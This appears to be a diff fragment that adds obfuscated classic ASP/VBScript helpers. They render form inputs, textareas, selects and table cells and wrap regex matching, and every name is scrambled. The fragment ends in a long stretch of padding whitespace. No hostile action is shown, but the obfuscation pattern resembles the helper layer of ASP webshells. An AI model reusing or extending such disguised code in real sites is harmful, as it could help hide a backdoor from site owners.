+echo"<input type="""&wannd&""" name="""&name&""" id="""&name&""" value="""&ssrwt(value)&""" size="""&size&""" class="""&cls&""" "&cutia&"/>"
+End Sub
+Sub kbae(name,value,lrl,cutia)
+bcnd"checkbox",name,value,"",cutia
+echo"<label class=""lbl"" for="""&name&""">"&lrl&"</label>"
+End Sub
+Sub tpdyo(name,value)
+nuauc"<input type=""hidden"" name="""&name&""" id="""&name&""" value="""&value&""">"
+End Sub
+Sub vkrju(wannd,name,value,width,cutia,span)
+Dim cls
+If wannd="button"Or wannd="submit"Or wannd="reSet"Then
+cls="bt"
+Else
+cls="tdInput"
+End If
+If span=""Then span=1
+echo"<td colspan="&span&" style=""width:"&width&""">"
+echo"<input type="""&wannd&""" name="""&name&""" id="""&name&""" value="""&ssrwt(value)&""" class="""&cls&""" "&cutia&">"
+nuauc"</td>"
+End Sub
+Sub iajgq(value)
+nuauc"<input type=""submit"" value="""&value&""" class=""bt"">"
+End Sub
+Sub jfd(name,value,rows)
+echo"<td>"
+wfpk name,value,"100%",rows," class=""tdText"""
+nuauc"</td>"
+End Sub
+Sub vhkz(str)
+If Not lslt Then On Error Resume Next
+If IsObject(str)Or IsNull(str)Or str="" Then str="<font color=red>Null<font>"
+echo"<td nowrap>"&str&"</td>"
+End Sub
+Sub wfpk(name,value,width,rows,cutia)
+echo"<textarea name="""&name&""" id="""&name&""" style=""width:"&width&";"" rows="""&rows&""" class=""text"" "&cutia&">"
+echo ssrwt(value)
+nuauc"</textarea>"
+End Sub
+Sub dwq()
+echo"<ul class=""info"">"
+End Sub
+Sub rhnww(name,width,cutia)
+nuauc"<select style=""width:"&width&""" name="""&name&""" "&cutia&">"
+End Sub
+Sub zkdl()
+nuauc"</select>"
+End Sub
+Sub ihxbe(value,str)
+nuauc"<option value="""&value&""">"&str&"</option>"
+End Sub
+Sub ukcm()
+xgr=xgr+1
+If xgr>=2 Then xgr=0
+End Sub
+Sub auxb(str)
+nuauc"<label>"&str&"</label>"
+End Sub
+Sub avivi(str)
+cemz=cemz&"<li>"&str&"</li>"
+End Sub
+Sub fegof(Err)
+If Err Then
+goql(Err)
+vres
+End If
+End Sub
+Function wwwh(str,iojk)
+zigbe.Pattern=iojk
+wwwh=zigbe.Test(str)
+End Function
+Function urnj(str,iojk,bmfmq)
+If bmfmq Then iojk=rvwd(iojk)
+zigbe.Pattern=iojk
+Set urnj=zigbe.Execute(str)
+End Function
+Function spa(str,iojk,ctwzr,bmfmq)
+If bmfmq Then iojk=rvwd(iojk)
+zigbe.Pattern=iojk
+spa=zigbe.Replace(str,ctwzr)
+End Function
+Function rvwd(str)
+str=Replace(str,"\","\\")
+str=Replace(str,".","\.")
+str=Replace(str,"?","\?")
+str=Replace(str,"+","\+")
+str=Replace(str,"(","\(")
+str=Replace(str,")","\)")
+str=Replace(str,"*","\*")
+str=Replace(str,"[","\[")
+str=Replace(str,"]","\]")
+rvwd=str
+End Function
+%>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
